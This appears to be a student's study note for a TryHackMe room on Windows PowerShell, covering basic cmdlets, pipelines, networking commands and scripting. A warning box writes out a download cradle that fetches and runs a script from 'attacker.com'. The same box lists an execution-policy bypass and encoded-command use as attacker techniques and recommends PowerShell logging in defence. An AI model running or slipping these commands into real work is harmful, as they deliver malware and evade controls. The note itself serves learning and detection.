---
tags: [THM, cyber-security-101, windows, PowerShell, room]
platform: TryHackMe
type: room
module: "04 - Command Line"
module_number: 4
room_number: 12
status: "⬜"
url: https://tryhackme.com/room/windowspowershell
difficulty: Easy
---

# ⚡ Windows PowerShell

> [!abstract] Summary
> Discover PowerShell — Windows' object-oriented scripting shell. Essential for admins and a primary attacker weapon. Learn cmdlets, pipelines, and why PowerShell is both powerful and dangerous.

**Path:** [[Cyber Security 101]] > Module 4 > Windows PowerShell

## 🎯 Learning Objectives
- Use essential PowerShell cmdlets
- Filter and pipeline objects
- Write basic PowerShell scripts
- Understand PowerShell security implications

## 📖 Key Concepts

### Essential Cmdlets
```powershell
Get-Help Get-Process          # Help
Get-Command -Name *service*   # Find commands
Get-ChildItem                 # ls/dir equivalent
Get-ChildItem -Recurse -Filter "*.txt"
Get-Content file.txt          # cat equivalent
Get-Process                   # All processes
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-LocalUser                 # Local users
Get-LocalGroupMember Administrators
```

### Pipelines & Filtering
```powershell
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Select-Object Name, Status | Sort-Object Name
Get-Process | Export-Csv processes.csv
```

### Networking
```powershell
Test-NetConnection google.com -Port 80   # Port check
Get-NetIPAddress                          # IP config
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
```

### Scripting
```powershell
$name = "Alice"
if ($name -eq "Alice") { Write-Host "Hello Alice" }
foreach ($item in Get-Process) { Write-Host $item.Name }
```

> [!warning] **PowerShell = attacker's favourite LotL tool:**
> - Download cradle: `IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`
> - Bypass execution policy: `powershell -ExecutionPolicy Bypass -File script.ps1`
> - Encoded command: `powershell -EncodedCommand <BASE64>`
> **Defence:** Enable Script Block Logging + Module Logging + Transcript logging.

## 🔑 Key Takeaways
- PowerShell is more powerful than CMD — object-based output
- PowerShell download cradles are primary malware delivery vectors
- Enable PowerShell logging for detection — it's disabled by default
- `-EncodedCommand` is a major red flag in process logs

## 🔗 Related Notes
- [[CS101-11 - Windows Command Line]] · [[CS101-13 - Linux Shells]]
- [[PowerShell]] · [[Living off the Land]] · [[Post-Exploitation]] · [[SIEM]]
